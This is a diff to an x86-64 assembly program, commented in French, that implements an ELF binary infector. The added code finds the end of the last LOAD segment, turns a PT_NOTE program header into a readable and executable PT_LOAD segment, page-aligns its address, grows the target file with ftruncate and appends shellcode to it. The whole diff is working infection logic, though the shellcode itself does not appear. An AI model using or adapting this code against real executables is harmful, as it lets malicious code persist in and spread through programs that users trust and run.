@@ -74,6 +74,15 @@ _start:
     xor r14, r14 ; r14 = max(vaddr + memsz) des LOAD
 
     .find_note:
+    cmp dword [rbx + P_TYPE], PT_LOAD       ; c'est un LOAD ?
+    jne .skip_max   ; non, on passe
+    mov rdx, [rbx + P_VADDR]    ; vaddr du LOAD
+    add rdx, [rbx + P_MEMSZ]    ; + memsz = fin du LOAD
+    cmp rdx, r14    ; plus grand que le max actuel ?
+    jle .skip_max   ; non, on passe
+    mov r14, rdx    ; oui, on met a jour le max
+.skip_max:
+
     cmp dword [rbx + P_TYPE], PT_NOTE       ; on compare la veleur p_type du phdr avec PT_NOTE
     je .found   ; si oui, saute a .found
 
@@ -86,7 +95,16 @@ _start:
 
     .found: ; label : PT_NOTE trouve
 
-    mov rax, [fsize]    ; taille du fichier cible (offset exact)
+    ; vaddr = max(fsize, r14) arrondi au 0x1000 superieur
+    mov rax, [fsize]    ; taille du fichier
+    cmp rax, r14    ; fsize > fin du dernier LOAD ?
+    jge .use_fsize  ; oui, on garde fsize
+    mov rax, r14    ; non, on prend r14
+.use_fsize:
+    add rax, 0xFFF  ; arrondir au 0x1000 superieur
+    and rax, ~0xFFF     ; enleve les 12 bits du bas
+    mov r14, rax    ; r14 = vaddr finale (pour ftruncate)
+
 
     mov dword [rbx + P_TYPE], PT_LOAD   ; type = PT_LOAD
     mov dword [rbx + P_FLAGS], PF_R | PF_X ; flags = lisible + executable
@@ -128,16 +146,24 @@ _start:
 
 
     ; append du shellcode
-    mov rdi, [fd] ; fd du binaire cible
-    xor rsi, rsi
-    mov rdx, 2
-    mov rax, 8 ; syscall lseek
+    ; 1 etendre le fichier a vaddr (r14)
+    mov rdi, [fd]   ; fd du binaire cible
+    mov rsi, r14    ; nouvelle taille = vaddr
+    mov rax, 77     ; syscall ftruncate
     syscall
 
-    mov rdi, [fd]                  
-    mov rsi, r13 ; pointeur vers le shellcode
-    mov rdx, r15 ; taille du shellcode
-    mov rax, 1
+    ; 2 se placer a la fin du fichier
+    mov rdi, [fd]
+    xor rsi, rsi
+    mov rdx, 2      ; SEEK_END
+    mov rax, 8      ; syscall lseek
+    syscall
+
+    ; 3 ecrire le shellcode
+    mov rdi, [fd]
+    mov rsi, r13    ; pointeur vers le shellcode
+    mov rdx, r15    ; taille du shellcode
+    mov rax, 1      ; syscall write
     syscall
 
     ; exit(0)
